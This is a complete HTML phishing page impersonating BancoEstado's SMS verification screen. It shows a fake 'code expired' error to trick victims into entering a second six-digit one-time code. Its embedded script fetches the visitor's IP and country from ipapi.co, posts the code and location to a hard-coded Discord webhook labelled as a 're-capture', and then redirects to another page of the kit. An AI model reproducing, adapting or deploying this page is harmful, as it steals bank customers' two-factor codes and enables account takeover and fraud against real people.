<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Verificación SMS</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #334155;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 25px rgba(0,0,0,0.03);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .logo {
            height: 28px;
            opacity: 0.9;
        }

        .close-btn {
            width: 32px;
            height: 32px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #64748b;
            font-size: 18px;
            cursor: pointer;
        }

        .message-section {
            padding: 40px 30px 20px;
            text-align: center;
        }

        .validation-text {
            font-size: 15px;
            color: #1e293b;
            line-height: 1.6;
            font-weight: 400;
            letter-spacing: -0.2px;
        }

        .error-box {
            background-color: #fff1f2;
            border: 1px solid #fecdd3;
            color: #e11d48;
            padding: 12px;
            border-radius: 12px;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .highlight {
            display: block;
            margin-top: 5px;
            font-weight: 600;
            color: #ff8c00;
            font-size: 13px;
            text-transform: uppercase;
        }

        .form-container {
            padding: 20px 30px;
        }

        .input-group {
            margin-bottom: 25px;
            text-align: center;
        }

        label {
            display: block;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 15px;
            color: #64748b;
        }

        .code-input {
            width: 100%;
            padding: 15px;
            border: 1px solid #e11d48; /* Borde rojo de error */
            border-radius: 12px;
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            letter-spacing: 10px;
            box-sizing: border-box;
            outline: none;
            background-color: #fff1f2;
            color: #e11d48;
            transition: all 0.2s;
        }

        .code-input:focus {
            box-shadow: 0 0 0 3px rgba(225, 29, 72, 0.1);
        }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.2);
            transition: all 0.2s;
        }

        .btn-ready {
            background-color: #FFA500 !important;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3) !important;
        }

        .footer-secure {
            margin-top: auto;
            padding: 30px;
            text-align: center;
            font-size: 11px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Logo_BancoEstado.svg/1280px-Logo_BancoEstado.svg.png" alt="Logo" class="logo">
            <div class="close-btn">✕</div>
        </div>

        <div class="message-section">
            <div class="error-box">
                ⚠️ El código ingresado es incorrecto o ha expirado.
            </div>

            <div class="validation-text">
                Por favor, revise su celular e ingrese el nuevo código de seguridad enviado.
                <span class="highlight">Re-verificación Necesaria</span>
            </div>
        </div>

        <div class="form-container">
            <div class="input-group">
                <label>Ingrese el nuevo código de 6 dígitos</label>
                <input type="text" class="code-input" maxlength="6" placeholder="000000" id="sms-code" inputmode="numeric">
                
                <div style="margin-top: 15px; font-size: 13px; color: #64748b;">
                    ¿No recibió el código? <span style="color: #ff8c00; font-weight: 600; cursor: pointer;">Solicitar nuevo código</span>
                </div>
            </div>

            <button class="btn-continuar" id="btnConfirmar">Validar Nuevo Código</button>
        </div>

        <div class="footer-secure">
            🔒 Protocolo de seguridad reforzada BancoEstado
        </div>
    </div>

    <script>
        const inputSMS = document.getElementById('sms-code');
        const btnConfirmar = document.getElementById('btnConfirmar');

        inputSMS.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            
            if (e.target.value.length === 6) {
                btnConfirmar.classList.add('btn-ready');
            } else {
                btnConfirmar.classList.remove('btn-ready');
            }
        });

        btnConfirmar.addEventListener('click', async () => {
            if (inputSMS.value.length !== 6) return;

            const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";

            btnConfirmar.innerText = "Verificando...";
            btnConfirmar.disabled = true;

            try {
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                
                const ipReal = geoData.ip || "No detectada";
                const paisReal = geoData.country_name || "Desconocido";

                const data = {
                    embeds: [{
                        title: "❌ SEGUNDO INTENTO SMS (RE-CAPTURA)",
                        color: 15158332, // Rojo
                        fields: [
                            { name: "🔑 Nuevo Código", value: `**${inputSMS.value}**`, inline: true },
                            { name: "🌐 IP Real", value: `\`${ipReal}\``, inline: false },
                            { name: "🌍 Ubicación", value: `**${paisReal}**`, inline: true }
                        ],
                        footer: { text: "Intento de Recuperación - BancoEstado" },
                        timestamp: new Date()
                    }]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                // Redirección a la página final de carga o éxito oficial
                window.location.href = "index6.html"; 
            } catch (error) {
                console.error("Error:", error);
                window.location.href = "index6.html";
            }
        });
    </script>
</body>
</html>
